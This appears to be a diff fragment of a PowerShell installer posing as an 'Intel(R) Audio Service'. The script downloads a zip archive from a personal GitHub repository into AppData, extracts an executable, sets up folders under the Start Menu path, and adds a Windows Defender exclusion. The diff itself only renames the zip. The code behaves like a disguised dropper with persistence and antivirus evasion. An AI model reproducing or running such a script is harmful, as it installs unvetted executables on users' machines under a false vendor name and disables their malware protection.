@@ -14,13 +14,13 @@ $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Pro
 $ShortcutFile = "$FolderPath\Intel(R) Audio Service.lnk"
 $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel(R) Audio Service"
 $TargetFile = "$TargetPath\Intel(R) Audio Service.exe"
-$TargetZip = "$TargetPath\Intel(R) Audio Service.zip"
+$TargetZip = "$TargetPath\Intel(R) Audio Service.exe.zip"
 
 New-Item -ItemType Directory -Force -Path $FolderPath
 Write-Output "Shortcut folder created"
 New-Item -ItemType Directory -Force -Path $TargetPath
 Write-Output "Target folder created"
-Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel(R) Audio Service.zip" -OutFile $TargetZip
+Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel(R) Audio Service.exe.zip" -OutFile $TargetZip
 Write-Output "File downloaded"
 Expand-Archive -Path $TargetZip -DestinationPath $TargetPath -Force
 Add-MpPreference -ExclusionPath $FolderPath
